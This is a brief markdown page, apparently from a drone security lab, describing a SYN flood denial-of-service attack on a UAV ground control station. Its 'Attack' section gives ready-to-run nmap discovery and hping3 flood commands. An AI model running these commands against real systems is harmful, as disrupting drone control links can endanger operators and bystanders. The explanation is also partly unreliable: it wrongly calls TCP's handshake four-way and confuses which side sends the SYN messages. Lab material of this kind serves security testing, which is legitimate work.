# Network Flood Attack

The TCP protocol is one of the core protocols used in the UAV-GCS communication channel.
It involves a four-way handshake between the GCS and the UAV.
The first step in this handshake involves sending a `SYN` message from the GCS to the UAV.
The network flood attack uses this type of message to open a connection with the GCS, but no more further messages.
The result is the GCS keeps the connection open (as it expects a response) until a timeout has been reached.
By sending many `SYN` messages to the GCS at once, it is possible to overwhelm its network interface and block further communication.

## Attack

1. Find the IP address of the GCS using `nmap -sn 192.168.1.0/24 -oG - 192.168.1`.
2. On the attacker machine, use `sudo hping3 -S --flood -V -p 3030 <GCS address>` to send `SYN` messages to the GCS.
